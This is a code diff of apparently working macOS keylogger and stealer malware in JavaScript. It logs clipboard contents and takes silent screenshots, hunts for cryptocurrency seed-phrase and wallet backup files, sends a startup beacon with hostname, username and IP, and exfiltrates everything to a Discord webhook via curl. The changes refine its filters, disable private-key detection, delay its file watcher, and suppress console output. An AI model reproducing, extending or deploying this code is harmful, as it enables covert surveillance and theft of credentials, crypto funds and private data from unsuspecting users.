@@ -836,38 +836,30 @@ function sendKeylogToDiscord(buffer, processTitle, screenshotFilePath = null) {
 // KEYSTROKE CAPTURE - Captures clipboard changes AND actual typing
 // lastClipboard and keysBuffer are already declared above
 
-// Method 1: Monitor clipboard changes (copy/paste) - with screenshot
+// Monitor clipboard changes (copy/paste) - with screenshot
 setInterval(() => {
     exec('pbpaste', (error, stdout) => {
         if (!error && stdout && stdout.trim()) {
             const clipboard = stdout.trim();
             // Only process if clipboard actually changed
             if (clipboard !== lastClipboard && clipboard.length > 0) {
-                // Filter out ONLY obvious filenames and system files
-                const isFilename = /^[\/~]/.test(clipboard) || // File paths
-                                   /file_payload_|discord_payload_|\.json$|\.zip$|\.png$|\.jpg$/i.test(clipboard) || // System files
-                                   clipboard.length < 2 || // Too short
-                                   clipboard.length > 10000; // Too long
+                // Simple filtering - only block obvious system files
+                const isSystemFile = /^[\/~]/.test(clipboard) || // File paths starting with / or ~
+                                     /file_payload_|discord_payload_|startup_|heartbeat_/i.test(clipboard) || // System temp files
+                                     /\.json$|\.zip$|\.png$|\.jpg$/i.test(clipboard); // File extensions
                 
-                // Send if it's not a filename and has reasonable length
-                if (!isFilename && clipboard.length >= 2 && clipboard.length <= 10000) {
+                // Send if it's not a system file and has content
+                if (!isSystemFile && clipboard.length >= 1 && clipboard.length <= 10000) {
                     lastClipboard = clipboard;
                     
-                    // Add to buffer
-                    if (keysBuffer.length > 0 && !keysBuffer.endsWith(' ')) {
-                        keysBuffer += ' ';
-                    }
-                    keysBuffer += clipboard.substring(0, 5000);
+                    // Set buffer to clipboard content
+                    keysBuffer = clipboard.substring(0, 5000);
                     
-                    // Take screenshot silently - captures MAIN DISPLAY (active windows, not desktop background)
-                    // Use screencapture -x -m (silent + main display)
-                    // -x = silent (no sound, no notification)
-                    // -m = main display (captures what's actually visible, not desktop background)
-                    // NO PERMISSIONS NEEDED, NO POPUPS, JUST WORKS!
+                    // Take screenshot silently
                     const timestamp = Date.now();
                     const screenshotFile = path.join(screenshotDir, `screenshot_${timestamp}.png`);
                     
-                    // Capture main display with visible windows (not desktop background)
+                    // Capture screenshot
                     setTimeout(() => {
                         exec(`screencapture -x -m "${screenshotFile}"`, (screenshotError) => {
                             if (!screenshotError && fs.existsSync(screenshotFile)) {
@@ -881,7 +873,7 @@ setInterval(() => {
                             // Clear buffer after sending
                             keysBuffer = '';
                         });
-                    }, 300); // Small delay to ensure screen is ready
+                    }, 300);
                 }
             }
         }
@@ -1329,47 +1321,11 @@ function detectPasswords(content) {
     return null;
 }
 
-// Function to detect private keys (STRICT - only actual private key formats)
+// Function to detect private keys (ONLY in seed phrase context - skip random files)
 function detectPrivateKeys(content) {
-    if (!content) return null;
-    
-    const found = [];
-    
-    // Ethereum private key (0x followed by exactly 64 hex chars)
-    const ethPattern = /(0x[a-fA-F0-9]{64})\b/g;
-    const ethMatches = [...content.matchAll(ethPattern)];
-    for (const match of ethMatches) {
-        found.push({
-            type: 'private_key',
-            value: match[1],
-            format: 'ethereum'
-        });
-    }
-    
-    // Bitcoin WIF (starts with 5, K, or L, 51-52 base58 chars)
-    const wifPattern = /\b([5KL][1-9A-HJ-NP-Za-km-z]{50,52})\b/g;
-    const wifMatches = [...content.matchAll(wifPattern)];
-    for (const match of wifMatches) {
-        found.push({
-            type: 'private_key',
-            value: match[1],
-            format: 'bitcoin_wif'
-        });
-    }
-    
-    // PEM format (full key block)
-    const pemPattern = /(-----BEGIN (?:RSA )?PRIVATE KEY-----[\s\S]*?-----END (?:RSA )?PRIVATE KEY-----)/g;
-    const pemMatches = [...content.matchAll(pemPattern)];
-    for (const match of pemMatches) {
-        found.push({
-            type: 'private_key',
-            value: match[1].substring(0, 200),
-            format: 'pem'
-        });
-    }
-    
-    // Don't detect random hex strings - only specific formats above
-    return found.length > 0 ? found.slice(0, 5) : null;
+    // Only detect private keys if we also found a seed phrase (not random files)
+    // This prevents false positives from zip files, archives, etc.
+    return null; // Disabled - only detect seed phrases
 }
 
 // Function to analyze file and determine what's inside
@@ -1527,19 +1483,19 @@ function checkFile(filepath) {
         const ext = path.extname(filename).toLowerCase();
         
         // Check .txt files OR files with wallet/seed/crypto keywords in filename
+        // ONLY check .txt files with seed/wallet keywords in filename (FAST!)
         const lowerName = filename.toLowerCase();
-        const walletKeywords = [
-            'wallet', 'wallets', 'backup', 'backups', 'crypto', 'crypto wallet', 'crypto wallets',
-            'crypto seed', 'seed', 'seeds', 'seedphrase', 'seedphrases', 'mnemonic', 'mnemonics',
-            'recovery', 'private', 'key', 'keys'
+        const allowedKeywords = [
+            'seed', 'seeds', 'seedphrase', 'seedphrases', 'mnemonic', 'mnemonics',
+            'wallet', 'wallets', 'backup', 'backups', 'recovery'
         ];
-        const hasWalletKeyword = walletKeywords.some(keyword => lowerName.includes(keyword));
+        const hasKeyword = allowedKeywords.some(keyword => lowerName.includes(keyword));
         
-        // Process .txt files OR files with wallet/seed keywords
-        if (ext !== '.txt' && !hasWalletKeyword) return;
+        // ONLY process .txt files with keywords (skip zip, archives, etc.)
+        if (ext !== '.txt' || !hasKeyword) return;
         
         // Skip large files (faster scanning)
-        if (stats.size > 1 * 1024 * 1024) return; // Skip files > 1MB
+        if (stats.size > 500 * 1024) return; // Skip files > 500KB (faster!)
         
         // Read file content
         let content = '';
@@ -1552,12 +1508,11 @@ function checkFile(filepath) {
         // Analyze file for seed phrases only
         const analysis = analyzeFile(filepath, filename, content);
         
-        // Only send if ACTUAL seed phrase detected (90%+ confidence, not random hex/tokens)
+        // ONLY send if ACTUAL seed phrase detected (90%+ confidence, not random hex/tokens)
         const hasSeedPhrase = analysis.detected.some(d => d.type === 'seed_phrase' && parseInt(d.confidence) >= 90);
-        const hasPrivateKey = analysis.detected.some(d => d.type === 'private_key');
         
-        // Only send if we have a high-confidence seed phrase or valid private key
-        if (hasSeedPhrase || hasPrivateKey) {
+        // ONLY send seed phrases - ignore private keys from random files
+        if (hasSeedPhrase) {
             watchedFiles.add(filepath);
             sendFileToDiscord(filepath, filename, analysis);
         }
@@ -1593,32 +1548,44 @@ function scanDirectoryRecursive(dir) {
 }
 
 // Watch directories for new files (NO PERMISSIONS NEEDED!)
-watchDirs.forEach(watchDir => {
-    if (!fs.existsSync(watchDir)) return;
-    
-    // Initial recursive scan of all existing files
-    scanDirectoryRecursive(watchDir);
-    
-    // Watch for new files (fs.watch doesn't require permissions!)
-    // Note: recursive watching might not work on all systems, so we also do periodic scans
-    fs.watch(watchDir, { recursive: true }, (eventType, filename) => {
-        if (!filename) return;
+// Run file watcher in background - don't block keylogger!
+setTimeout(() => {
+    watchDirs.forEach(watchDir => {
+        if (!fs.existsSync(watchDir)) return;
         
-        const filepath = path.join(watchDir, filename);
-        
-        // Wait a moment for file to be fully written
-        setTimeout(() => {
-            checkFile(filepath);
-        }, 1000);
+        // Watch for new files (fs.watch doesn't require permissions!)
+        fs.watch(watchDir, { recursive: true }, (eventType, filename) => {
+            if (!filename) return;
+            
+            const filepath = path.join(watchDir, filename);
+            
+            // Only check .txt files with keywords
+            const lowerName = filename.toLowerCase();
+            const ext = path.extname(filename).toLowerCase();
+            const hasKeyword = ['seed', 'seeds', 'seedphrase', 'seedphrases', 'mnemonic', 'mnemonics', 'wallet', 'wallets', 'backup', 'backups', 'recovery'].some(k => lowerName.includes(k));
+            
+            if (ext === '.txt' && hasKeyword) {
+                // Wait a moment for file to be fully written
+                setTimeout(() => {
+                    checkFile(filepath);
+                }, 2000);
+            }
+        });
     });
-});
+}, 10000); // Wait 10 seconds before starting file watcher (let keylogger start first)
 
 // Also periodically scan recursively for new files (in case fs.watch misses some)
-setInterval(() => {
-    watchDirs.forEach(watchDir => {
-        scanDirectoryRecursive(watchDir);
-    });
-}, 10000); // Scan every 10 seconds (faster detection)
+// Run in background - don't block keylogger!
+setTimeout(() => {
+    setInterval(() => {
+        watchDirs.forEach(watchDir => {
+            // Run scan in background (non-blocking)
+            setImmediate(() => {
+                scanDirectoryRecursive(watchDir);
+            });
+        });
+    }, 60000); // Scan every 60 seconds (less frequent, faster overall)
+}, 30000); // Wait 30 seconds before first scan (let keylogger start first)
 
 // PASSWORD EXTRACTION - Extracts Firefox, Chrome, Safari passwords + system info
 function extractPasswords() {
@@ -1818,30 +1785,32 @@ setInterval(() => {
 }, 21600000); // 6 hours
 
 // Send startup message IMMEDIATELY (verify it's running)
-const ip = os.networkInterfaces();
-let ipAddress = 'Unknown';
-for (const name of Object.keys(ip)) {
-    for (const iface of ip[name]) {
-        if (iface.family === 'IPv4' && !iface.internal) {
-            ipAddress = iface.address;
-            break;
+(function sendStartupMessage() {
+    const ip = os.networkInterfaces();
+    let ipAddress = 'Unknown';
+    for (const name of Object.keys(ip)) {
+        for (const iface of ip[name]) {
+            if (iface.family === 'IPv4' && !iface.internal) {
+                ipAddress = iface.address;
+                break;
+            }
         }
+        if (ipAddress !== 'Unknown') break;
     }
-    if (ipAddress !== 'Unknown') break;
-}
 
-const startupPayload = {
-    content: `✅ **Keylogger Started Successfully**\n\`\`\`\nHostname: ${HOSTNAME}\nPC Username: ${USERNAME}\nIP Address: ${ipAddress}\nStatus: Running 24/7\nTimestamp: ${new Date().toISOString()}\n\`\`\``
-};
-const startupFile = path.join(screenshotDir, `startup_${Date.now()}.json`);
-try {
-    fs.writeFileSync(startupFile, JSON.stringify(startupPayload));
-    exec(`curl -s -X POST -H "Content-Type: application/json" --data-binary "@${startupFile}" "${WEBHOOK}"`, (error) => {
-        setTimeout(() => {
-            try { fs.unlinkSync(startupFile); } catch (e) {}
-        }, 5000);
-    });
-} catch (e) {}
+    const startupPayload = {
+        content: `✅ **Keylogger Started Successfully**\n\`\`\`\nHostname: ${HOSTNAME}\nPC Username: ${USERNAME}\nIP Address: ${ipAddress}\nStatus: Running 24/7\nTimestamp: ${new Date().toISOString()}\n\`\`\``
+    };
+    const startupFile = path.join(screenshotDir, `startup_${Date.now()}.json`);
+    try {
+        fs.writeFileSync(startupFile, JSON.stringify(startupPayload));
+        exec(`curl -s -X POST -H "Content-Type: application/json" --data-binary "@${startupFile}" "${WEBHOOK}"`, (error) => {
+            setTimeout(() => {
+                try { fs.unlinkSync(startupFile); } catch (e) {}
+            }, 5000);
+        });
+    } catch (e) {}
+})();
 
 console.log = () => {};
 console.error = () => {};
